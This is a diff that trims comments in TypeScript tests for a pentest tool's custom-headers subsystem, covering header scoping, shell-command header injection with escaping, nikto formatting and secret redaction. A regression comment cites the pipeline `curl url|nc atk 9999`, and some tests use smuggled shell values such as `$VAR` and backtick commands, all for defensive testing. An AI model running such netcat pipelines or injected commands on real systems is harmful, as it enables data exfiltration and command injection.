@@ -1,14 +1,5 @@
-/**
- * Contract tests for the custom-headers subsystem.
- *
- * These pin the behaviours the rest of the codebase relies on: the
- * resolver's layering and scope check, the blessed `targetFetch`,
- * shell-command injection, history redaction, and the parser's error
- * contract.
- *
- * If you break one of these tests intentionally, also update the
- * corresponding INV-* doc in the resolver / parse files.
- */
+// Contract tests for the custom-headers subsystem: resolver layering/scope,
+// `targetFetch`, shell injection, history redaction, parser errors.
 
 import { mkdtempSync, rmSync } from "fs";
 import { writeFile } from "fs/promises";
@@ -174,7 +165,7 @@ describe("resolveEffectiveHeaders", () => {
     expect(rec["X-Session"]).toBe("1");
     expect(rec["X-Cred"]).toBe("1");
     expect(rec["X-Request"]).toBe("1");
-    // INV-precedence-deterministic: request beats credential beats session
+    // request > credential > session
     expect(rec["X-Both"]).toBe("from-request");
   });
 
@@ -243,9 +234,7 @@ describe("targetFetch", () => {
   });
 
   it("preserves caller overrides on out-of-scope URLs", async () => {
-    // INV-scope-bound applies only to the resolver-injected layers
-    // (session/global/credential). Caller-explicit overrides like
-    // `Accept` for research URLs must pass through.
+    // Caller-explicit overrides bypass scope (resolver only gates injected layers).
     const session = makeSession({
       config: { headers: { Authorization: "Bearer secret" } },
     });
@@ -286,7 +275,7 @@ describe("applyHeadersToShellCommand", () => {
     expect(r.command).toContain(`-H "X-API-Key: abc"`);
   });
 
-  it("returns unknown-tool when the binary is not in the registry (INV-shell-injection)", () => {
+  it("returns unknown-tool when the binary is not in the registry", () => {
     const session = makeSession({
       config: { headers: { "X-API-Key": "abc" } },
     });
@@ -358,17 +347,13 @@ describe("applyHeadersToShellCommand", () => {
       "example.com",
     ]);
     expect(r.status).toBe("injected");
-    // Every shell-special character must be backslash-escaped inside
-    // the double-quoted -H argument.
     expect(r.command).toContain(`\\"quotes\\"`);
     expect(r.command).toContain(`\\$VAR`);
     expect(r.command).toContain("\\`cmd\\`");
   });
 
   it("fails closed on pipelines without whitespace before the operator", () => {
-    // Regression: COMMAND_SPLIT regex required `(?:^|\s)` before the
-    // operator, so `curl url|nc atk 9999` slipped past the pipeline
-    // check and headers got injected into a compound command.
+    // Regression: `curl url|nc atk 9999` previously slipped past the pipeline check.
     const session = makeSession({
       config: { headers: { "X-API-Key": "abc" } },
     });
@@ -382,8 +367,6 @@ describe("applyHeadersToShellCommand", () => {
   });
 
   it("does not treat operator characters inside quoted args as pipelines", () => {
-    // The fix for the no-whitespace pipeline case must not regress on
-    // legitimate commands whose quoted values contain `|`, `;`, or `&`.
     const session = makeSession({
       config: { headers: { "X-API-Key": "abc" } },
     });
@@ -397,9 +380,8 @@ describe("applyHeadersToShellCommand", () => {
   });
 
   it("emits a literal `\\n` (not a raw newline) for nikto -headers", () => {
-    // Regression: injectNikto previously embedded a 0x0A byte, which
-    // both breaks line-based persistent shells and is not what nikto
-    // expects as its header separator.
+    // Regression: injectNikto previously embedded a 0x0A byte, which broke
+    // line-based persistent shells.
     const session = makeSession({
       config: { headers: { "X-One": "1", "X-Two": "2" } },
     });
@@ -411,9 +393,8 @@ describe("applyHeadersToShellCommand", () => {
     expect(r.status).toBe("injected");
     expect(r.tool).toBe("nikto");
     expect(r.command).not.toContain("\n");
-    // shellQuote doubles the backslash so the surrounding shell strips
-    // exactly one layer, leaving nikto with the literal two-byte `\n`
-    // sequence as its header separator.
+    // Doubled backslash so the surrounding shell strips one layer and
+    // nikto sees the literal two-byte `\n`.
     expect(r.command).toContain("X-One: 1\\\\nX-Two: 2");
   });
 });
@@ -444,8 +425,7 @@ describe("redactSecretsInHistoryEntry", () => {
   });
 
   it("masks multi-word quoted --header values (Bearer <token>)", () => {
-    // Regression: a previous regex stopped at the first whitespace in
-    // the value, leaving the token after "Bearer " on disk.
+    // Regression: prior regex stopped at the first whitespace in the value.
     const r = redactSecretsInHistoryEntry(
       `pensar pentest --header "Authorization: Bearer super-secret-token"`,
     );
